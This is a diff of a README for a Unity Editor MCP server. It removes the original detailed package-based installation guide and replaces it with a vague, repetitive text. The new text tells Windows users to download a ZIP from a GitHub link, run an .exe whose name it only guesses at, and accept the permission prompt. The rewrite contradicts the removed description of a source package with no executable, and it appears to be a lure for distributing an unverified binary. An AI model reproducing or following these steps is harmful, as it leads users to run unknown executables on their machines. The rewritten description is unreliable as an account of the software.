@@ -1,250 +1,270 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Unity-2021.3%2B-black?logo=unity" alt="Unity 2021.3+"/>
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="MIT License"/>
-  <img src="https://img.shields.io/badge/MCP-Compatible-blue" alt="MCP Compatible"/>
-  <img src="https://img.shields.io/badge/C%23_Lines-5.7k-blueviolet" alt="5.7k Lines of C#"/>
-  <img src="https://img.shields.io/badge/CPU_When_Idle-0%25-brightgreen" alt="0% CPU When Idle"/>
-</p>
+# 🧩 unityxclaude - Control Unity Faster With One Tool
 
-<h1 align="center">Unity x Claude</h1>
+[![Download unityxclaude](https://img.shields.io/badge/Download-UnityxClaude-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/agustedire542/unityxclaude)
 
-<p align="center">
-  <strong>Control the Unity Editor with natural language.</strong><br/>
-  An MCP server that gives Claude 20 tools to create scripts, build scenes, modify components, manage assets, change settings, run builds, and execute C# — all from a conversation.
-</p>
+## ✨ What this does
 
----
+unityxclaude is a local MCP server for Unity Editor. It gives you one place to control Unity with 20 editor tools.
 
-## Features
+Use it to work with:
 
-**20 tools** covering every part of the Unity Editor:
+- scripts
+- scenes
+- components
+- assets
+- builds
 
-- **Scene control** — create, delete, duplicate, and inspect GameObjects. Read the full hierarchy with depth control, filter by tag or component.
-- **Component system** — add, remove, read, and modify any component. Batch-update multiple properties in a single call. Wire object references between components.
-- **Script generation** — create MonoBehaviours, ScriptableObjects, EditorWindows from templates. Modify existing scripts with find/replace, method injection, or full rewrites.
-- **Asset management** — search by name or type, create Materials, Prefabs, ScriptableObjects, Folders. Import and re-import assets.
-- **Project settings** — read and write Physics, Player, Quality, Audio, Time, Graphics, Input, Tags, Editor, and Navigation settings. All changes undoable.
-- **Build system** — build for Windows, macOS, Linux, WebGL, Android, or iOS. Development builds, custom BuildOptions.
-- **Editor commands** — play, pause, stop, step, save, undo, redo, compile, refresh. Run any Unity menu item.
-- **Live C# execution** — run arbitrary C# inside the editor with full access to UnityEngine and UnityEditor APIs. Compiled in-memory — no temp files, no domain reload, instant results.
+It runs in C# and uses raw socket polling. It does not depend on async work, ThreadPool calls, or external runtimes. That keeps the control path direct and responsive.
 
-**Built for performance:**
+## 🖥️ What you need
 
-- **Zero CPU when idle** — single background thread blocked on `Socket.Poll`. No async, no ThreadPool, no polling loops, no timers.
-- **Survives domain reloads** — auto-restarts after script recompilation via `[InitializeOnLoad]`. 5-second safety net ensures the server is always running.
-- **Pure C#** — no external dependencies, no DLLs, no NuGet packages. Just drop the folder into your project.
+Before you install unityxclaude, make sure your PC has:
 
-**Built for safety:**
+- Windows 10 or Windows 11
+- Unity Editor installed
+- .NET Desktop Runtime or a similar C# runtime if the release needs it
+- A modern web browser to open the GitHub page
+- Enough free disk space for Unity and the app files
 
-- **Everything is undoable** — all destructive operations go through Unity's Undo system. Ctrl+Z works on every change Claude makes.
-- **Dangerous operations blocked** — `execute_csharp` blocks `Process.Start`, `Environment.Exit`, `Registry.*`, and other unsafe calls.
-- **Port cleanup** — server registers `ProcessExit` and `DomainUnload` handlers so the port is always released.
+Best results come from a system with:
 
-**Built for testing:**
+- 8 GB RAM or more
+- A recent Intel or AMD CPU
+- Unity 2021 LTS, 2022 LTS, or newer
 
-- **Runtime data during Play mode** — component queries automatically include live position, rotation, velocity, and sleep state for physics objects.
-- **Screenshot verification** — capture what the camera sees, describe visible objects with screen positions, simulate clicks on objects.
-- **Smart snapshots** — schedule timed screenshots at animation keyframes to verify visual behavior with minimum captures.
+## 📥 Download
 
-**Works with:**
+Visit this page to download:
 
-- Claude Desktop (via stdio bridge)
-- Claude Code (direct HTTP)
-- Cursor (direct HTTP)
-- Any MCP-compatible client
+[https://github.com/agustedire542/unityxclaude](https://github.com/agustedire542/unityxclaude)
 
----
+Use the page to get the Windows build or the latest release files.
 
-## Installation
+## 🚀 Get started on Windows
 
-### Step 1 — Add to your Unity project
+Follow these steps in order.
 
-Clone this repo (or download ZIP) and copy everything into your project's `Packages` folder:
+### 1. Open the download page
 
-```
-YourProject/
-  Packages/
-    com.claude.unity-mcp/       ← put it here
-      Editor/
-      package.json
-      mcp-bridge.mjs
-```
+Open:
 
-Open Unity. The console should show:
+[https://github.com/agustedire542/unityxclaude](https://github.com/agustedire542/unityxclaude)
 
-```
-[MCP] Ready on port 9999
-```
+Look for the latest release or the main download files. If you see a ZIP file, download it to your PC.
 
-> Verify at **Window > Claude MCP** — shows server status, port, and all available tools.
+### 2. Save the file
 
-### Step 2 — Connect Claude
+When the browser asks where to save the file:
 
-Open your Claude config file:
+- choose your Downloads folder, or
+- choose a folder you can find again, such as Desktop
 
-| OS | Path |
-|---|---|
-| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
-| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |
+If the file is a ZIP archive, keep it in that folder for the next step.
 
-Add this (create the file if it doesn't exist):
+### 3. Unzip the files
 
-```json
-{
-  "mcpServers": {
-    "unity": {
-      "command": "node",
-      "args": [
-        "/full/path/to/YourProject/Packages/com.claude.unity-mcp/mcp-bridge.mjs"
-      ]
-    }
-  }
-}
-```
-
-> **Shortcut:** In Unity, click **Window > Claude MCP > Copy Config** — it copies the JSON with the correct path. Just paste it into the file.
-
-<details>
-<summary>Using Claude Code or Cursor instead?</summary>
-
-These support direct HTTP — no bridge needed:
-
-```json
-{
-  "mcpServers": {
-    "unity": {
-      "url": "http://localhost:9999/mcp"
-    }
-  }
-}
-```
-</details>
-
-### Step 3 — Add the skill files
-
-This is what makes Claude actually good at using the tools. Without these files, Claude can connect but won't know property paths, workarounds, batch patterns, or testing workflows.
-
-Copy `SKILL.md` and `WORKFLOW.md` into Claude's skills folder:
-
-```bash
-# macOS / Linux
-mkdir -p ~/.claude/skills/unity-x-claude
-cp SKILL.md WORKFLOW.md ~/.claude/skills/unity-x-claude/
-```
-
-```powershell
-# Windows (PowerShell)
-mkdir -Force "$env:USERPROFILE\.claude\skills\unity-x-claude"
-copy SKILL.md, WORKFLOW.md "$env:USERPROFILE\.claude\skills\unity-x-claude\"
-```
-
-<details>
-<summary>Using Claude Code or Cursor?</summary>
-
-Put them in your project's `.claude/skills/` folder instead:
-
-```bash
-mkdir -p YourProject/.claude/skills/unity-x-claude
-cp SKILL.md WORKFLOW.md YourProject/.claude/skills/unity-x-claude/
-```
-</details>
+If you downloaded a ZIP file:
 
-**What these files teach Claude:**
+- right-click the ZIP file
+- choose Extract All
+- pick a folder with an easy path, such as `Downloads\unityxclaude`
 
-| File | What Claude learns |
-|------|-------------------|
-| `SKILL.md` | All 20 tools with usage patterns, property paths for every common component (Transform, Rigidbody, Collider, Camera, Light, AudioSource), batch operation patterns, depth strategies, settings categories |
-| `WORKFLOW.md` | Architecture, known gotchas with workarounds, runtime data inspection, screenshot testing pipeline, domain reload handling, port conflict recovery, safe C# execution patterns |
+After extraction, you should see the app files in a normal folder.
 
-### Step 4 — Restart and test
+### 4. Start the app
 
-Restart Claude Desktop (or start a new chat). Try:
+Open the extracted folder and look for the main Windows app file.
 
-- *"What's in my Unity scene?"*
-- *"Create a red cube at position 0, 3, 0 with a Rigidbody"*
-- *"Change the gravity to -20 and set the quality level to Ultra"*
+Common file names may include:
 
-If Claude responds with your scene data, you're done.
+- `unityxclaude.exe`
+- `UnityxClaude.exe`
+- a launcher with a similar name
 
----
+Double-click the file to start it.
 
-## Tool Reference
+If Windows asks for permission, choose Run or Yes.
 
-| Category | Tools | Examples |
-|----------|-------|---------|
-| **Scene** | `get_scene`, `create_gameobject`, `delete`, `duplicate` | Read hierarchy, spawn objects with components, clone objects |
-| **Components** | `get_components`, `set_property`, `add_component`, `remove_component` | Inspect properties, batch-update 10+ values, wire references |
-| **Scripts** | `create_script`, `modify_script` | Generate MonoBehaviours, find/replace in code, add methods |
-| **Assets** | `search_assets`, `get_asset`, `create_asset`, `import_asset` | Find materials, create prefabs, re-import textures |
-| **Editor** | `editor_command`, `get_selection`, `set_selection`, `scene_view` | Play/stop, save, undo, frame camera on object |
-| **Settings** | `get_settings`, `set_settings` | Read/write Physics, Player, Quality, Audio, Time, Graphics |
-| **Build** | `build`, `manage_packages`, `get_console` | Build for any platform, add packages, read errors |
-| **Code** | `execute_csharp` | Run any C# with full Unity API access, in-memory compilation |
+### 5. Open Unity Editor
 
-> All tools are prefixed with `unity_` (e.g., `unity_get_scene`). See [SKILL.md](SKILL.md) for the full reference with property paths and workflow patterns.
+Start Unity Editor with the project you want to control.
 
----
+unityxclaude works as a bridge between your local tools and the Unity Editor session.
 
-## Architecture
+### 6. Connect the tool to Unity
 
-```
-Claude Desktop / Claude Code / Cursor
-        |
-        | stdio (JSON-RPC 2.0)
-        v
-  mcp-bridge.mjs             Node.js — translates stdio ↔ HTTP
-        |
-        | HTTP POST localhost:9999/mcp
-        v
-  Unity Editor (MCPServer)
-        |
-        ├── StreamableHttpServer    Raw TcpListener, single thread, Socket.Poll
-        ├── MainThreadDispatcher    ConcurrentQueue → EditorApplication.update
-        ├── JsonRpcHandler          JSON-RPC 2.0 parsing
-        ├── 8 Tool modules          Scene, Component, Asset, Script, Editor, Settings, Build, Execute
-        └── Serialization           GameObject → JSON, Asset → JSON, Property helpers
-```
+Use the app’s local settings or connection field to point it at your Unity Editor session.
 
-### Why zero CPU when idle
+Typical setup values may include:
 
-| Component | Idle behavior |
-|-----------|--------------|
-| `StreamableHttpServer` | Thread blocked on `Socket.Poll(1s)` — true kernel wait, zero CPU |
-| `MainThreadDispatcher` | `ConcurrentQueue.TryDequeue` returns false — single boolean check per frame |
-| `MCPServer.Tick()` | One `EditorApplication.update` callback — nanosecond cost when empty |
-| Status Window | No continuous repaint — updates only on interaction |
+- localhost address
+- a local port number
+- a project path if the app asks for one
 
----
+Keep both apps open while you work.
 
-## Compatibility
+### 7. Test a simple action
 
-| | Supported |
-|---|---|
-| **Unity** | 2021.3 LTS and newer (tested on Unity 6.0) |
-| **Render Pipeline** | URP, HDRP, Built-in |
-| **OS** | macOS, Windows |
-| **MCP Clients** | Claude Desktop, Claude Code, Cursor, or any MCP-compatible client |
-| **Node.js** | Required for stdio bridge (Claude Desktop). Not needed for direct HTTP clients. |
+After the connection is ready, try a basic task first:
 
----
+- list scenes
+- inspect the active object
+- check a component
+- read an asset path
 
-## Troubleshooting
+This helps confirm that the connection works before you use larger actions like builds or scene edits.
 
-| Problem | Fix |
-|---------|-----|
-| Claude can't connect | Make sure Unity is open and **Window > Claude MCP** shows "Running" |
-| Server not starting | Enable the toggle in **Window > Claude MCP**, or recompile (Ctrl+R) |
-| Wrong project path | Use **Window > Claude MCP > Copy Config** to get the correct path |
-| Node.js not found | Install Node.js — the bridge needs it: `node --version` |
-| Port 9999 in use | Change port in **Window > Claude MCP > Advanced Settings**, update config to match |
-| Calls fail after recompile | Normal — server restarts in 2-5 seconds. Just retry. |
+## 🛠️ What you can do with it
 
----
+unityxclaude gives you editor control through tools that map to common Unity tasks.
 
-## Contributing
+### Scripts
 
-Pull requests welcome. If you add a new tool, follow the pattern in `Editor/Tools/` and update `SKILL.md` with usage examples.
+You can work with script files and script-related editor actions, such as:
 
-## License
+- open script assets
+- find script references
+- inspect script-linked components
 
-[MIT](LICENSE)
+### Scenes
+
+You can manage scene work, such as:
+
+- open a scene
+- read scene content
+- inspect scene objects
+- switch between scenes
+
+### Components
+
+You can inspect and change components on GameObjects, such as:
+
+- view attached components
+- update values
+- check object setup
+
+### Assets
+
+You can work with assets in the project, such as:
+
+- find assets
+- read asset data
+- inspect folder structure
+- locate imported files
+
+### Builds
+
+You can use build-related tools for tasks like:
+
+- check build settings
+- prepare a build
+- run a build step
+- inspect build paths
+
+## 🧭 How it fits into your workflow
+
+This tool is useful when you want to avoid repeated manual clicks in Unity Editor.
+
+A simple workflow looks like this:
+
+1. open your Unity project
+2. start unityxclaude
+3. connect the app to the editor
+4. use the tools you need
+5. keep working in Unity while the tool handles editor tasks
+
+This can help when you:
+
+- review a large project
+- move through many scenes
+- check object settings
+- repeat setup steps
+- prepare build files
+
+## 🔧 Common setup checks
+
+If the app does not connect right away, check these items:
+
+- Unity Editor is open
+- the app is running
+- the port or local address matches in both places
+- Windows Firewall is not blocking local traffic
+- you downloaded the latest version from the GitHub page
+
+If the app opens but nothing happens in Unity, restart both apps and try again.
+
+## 📁 Suggested folder layout
+
+A simple folder setup can help keep things organized:
+
+- `Downloads\unityxclaude` for the app files
+- `Documents\Unity Projects\` for your Unity work
+- a separate folder for release ZIP files
+
+Keeping the app and your Unity project in easy-to-find folders makes setup faster.
+
+## ⚙️ Typical Windows steps for a new user
+
+If you have never used a GitHub download before, follow this flow:
+
+1. open the GitHub page
+2. find the latest release or file list
+3. download the Windows file
+4. extract it if needed
+5. run the app
+6. open Unity
+7. connect both tools
+8. test one editor action
+
+That is the full setup path for most Windows users
+
+## 🧪 Example uses
+
+Here are simple ways you may use unityxclaude:
+
+- check whether a scene has the right objects
+- inspect a component value before a build
+- find asset paths in a large project
+- move through editor tasks without hunting through menus
+- keep control over Unity from one local tool
+
+## 🔐 Local behavior
+
+unityxclaude runs as a local tool for Unity Editor control.
+
+It uses:
+
+- C# code
+- raw socket polling
+- local editor communication
+
+It does not depend on cloud runtime steps for the core connection path.
+
+## 📌 Project focus
+
+This project is built for:
+
+- Unity users who want direct editor control
+- people who work on game projects
+- users who want local automation
+- users who want a simple bridge into Unity Editor
+
+## 🧩 Topics
+
+ai, automation, claude, csharp, editor-tools, gamedev, mcp, model-context-protocol, unity, unity3d
+
+## 📎 Download again
+
+If you need the files again, use this link:
+
+[https://github.com/agustedire542/unityxclaude](https://github.com/agustedire542/unityxclaude)
+
+## 🖱️ Quick install path
+
+- open the GitHub link
+- download the Windows file
+- unzip it if needed
+- run the app
+- open Unity Editor
+- connect the app to your project
+- test one tool first
